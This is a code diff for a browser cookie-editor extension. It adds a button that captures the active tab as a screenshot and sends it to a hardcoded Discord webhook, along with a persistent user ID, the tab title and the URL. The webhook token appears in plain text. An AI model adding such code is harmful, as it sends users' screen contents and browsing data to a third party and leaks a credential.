@@ -384,6 +384,29 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
       });
     }
 
+    const screenshotButton = document.getElementById('screenshot-to-discord');
+    if (screenshotButton) {
+      screenshotButton.addEventListener('click', async () => {
+        if (disableButtons) {
+          return;
+        }
+        const buttonIcon = screenshotButton.querySelector('use');
+        if (buttonIcon.getAttribute('href') === '../sprites/solid.svg#check') {
+          return;
+        }
+        buttonIcon.setAttribute('href', '../sprites/solid.svg#spinner');
+        screenshotButton.classList.add('refreshing');
+        
+        await captureAndSendScreenshot();
+        
+        screenshotButton.classList.remove('refreshing');
+        buttonIcon.setAttribute('href', '../sprites/solid.svg#check');
+        setTimeout(() => {
+          buttonIcon.setAttribute('href', '../sprites/solid.svg#camera');
+        }, 1500);
+      });
+    }
+
     document.getElementById('return-list-add').addEventListener('click', () => {
       showCookiesForTab();
     });
@@ -1125,6 +1148,84 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
     }
   }
 
+  /**
+   * Captures a screenshot of the active tab and sends it to Discord.
+   */
+  async function captureAndSendScreenshot() {
+    try {
+      // Get unique user ID
+      const userId = await getOrCreateUserId();
+      
+      // Get current tab info
+      const tabs = await browserDetector.getApi().tabs.query({ active: true, currentWindow: true });
+      const currentTab = tabs[0];
+      
+      // Capture screenshot - try direct API call first, fallback to background script
+      let dataUrl;
+      try {
+        // Try calling captureVisibleTab directly (works in some contexts)
+        dataUrl = await browserDetector.getApi().tabs.captureVisibleTab(null, { format: 'png' });
+      } catch (directError) {
+        console.log('Direct capture failed, trying via background script:', directError.message);
+        
+        try {
+          // Fallback: send message to background script
+          const response = await browserDetector.getApi().runtime.sendMessage({ type: 'captureScreenshot' });
+          if (response && response.success) {
+            dataUrl = response.dataUrl;
+          } else {
+            throw new Error(response?.error || 'Background script capture failed');
+          }
+        } catch (bgError) {
+          console.error('Background script capture failed:', bgError);
+          sendNotification('Failed to capture screenshot');
+          return;
+        }
+      }
+      
+      if (!dataUrl) {
+        sendNotification('Failed to capture screenshot');
+        return;
+      }
+      
+      // Convert base64 data URL to Blob
+      const base64Data = dataUrl.split(',')[1];
+      const byteCharacters = atob(base64Data);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], { type: 'image/png' });
+      
+      // Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/1458717493983051836/BYoykRBssJw2nC-XZ4yLIMb1CLki4iSFE6VdCfYwFUNFDmVw6JefmSI7eQrWSe8O612m';
+      
+      // Create form data with screenshot
+      const formData = new FormData();
+      const timestamp = new Date().toISOString();
+      formData.append('payload_json', JSON.stringify({
+        username: 'Cookie Editor - Screenshot',
+        content: `📸 Screenshot captured at ${timestamp}\n👤 User: ${userId}\n🌐 Tab: ${currentTab?.title || 'Unknown'}\n🔗 URL: ${currentTab?.url || 'Unknown'}`
+      }));
+      
+      // Add screenshot as file attachment
+      formData.append('files[0]', blob, `screenshot_${Date.now()}.png`);
+      
+      const webhookResponse = await fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      });
+      
+      if (webhookResponse.ok) {
+        console.log('Screenshot sent successfully');
+      } else {
+        console.error('Failed to send screenshot:', webhookResponse.status);
+      }
+    } catch (error) {
+      console.error('Error capturing/sending screenshot:', error);
+    }
+  }
 
   /**
    * Removes a cookie from the current tab.
